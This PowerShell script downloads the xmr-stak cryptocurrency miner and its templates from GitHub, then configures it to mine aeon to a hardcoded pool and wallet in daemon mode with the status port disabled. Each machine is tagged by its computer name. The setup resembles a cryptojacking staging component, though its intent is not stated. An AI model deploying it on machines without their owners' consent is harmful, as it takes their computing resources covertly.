# Advance Party functions

function payload ($destination) { 

# Get xmr-stak from github.
    
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip -OutFile $destination

}

function configTpl () {

 # Get config template from github
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/config.tpl

}

function poolTpl () {

# Get pool template from github
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-RestMethod -Uri https://raw.githubusercontent.com/fireice-uk/xmr-stak/master/xmrstak/pools.tpl

}

function stripExcess ($template) {

# strip out unneeded characters from the configuration templates
$head = 'R"===('
$tail = ')==="'

$template = $template.replace($head, "")
$template = $template.replace($tail, "")

$template.Replace("`n","`r`n")


}

function alterConfigTpl ($file) {

# alter the downloaded config template and set configuration
(Get-Content "$file") | ForEach-Object { $_ -replace '"verbose_level" : 3,','"verbose_level" : 4,' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace '"print_motd" : true,','"print_motd" : false,' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace '"h_print_time" : 60,','"h_print_time" : 300,' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace '"daemon_mode" : false,','"daemon_mode" : true,' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace '"flush_stdout" : false,','"flush_stdout" : true,' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace '"httpd_port" : HTTP_PORT,','"httpd_port" : 0,' } | Set-Content "$file"

}

function alterPoolTpl ($file) {

#alter the pool downloaded pool template and set configuration

(Get-Content "$file") | ForEach-Object { $_ -replace '"currency" : "CURRENCY"','"currency" : "aeon7"' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace "POOLCONF",'{"pool_address" : "pool.aeonminingpool.com:3335", "wallet_address" : "Wmt1MRyhVkffvWShqLBbytMWfdkRhzago6wHn61cgnMEMDEm5HNMsdmBycerj5iJVFjkEDAFcaVDiUxUEea6EvTJ1fhpkFnQc", "rig_id" : "", "pool_password" : "COMPUTERNAME", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },
' } | Set-Content "$file"
(Get-Content "$file") | ForEach-Object { $_ -replace "COMPUTERNAME" ,"$env:COMPUTERNAME" } | Set-Content "$file"

}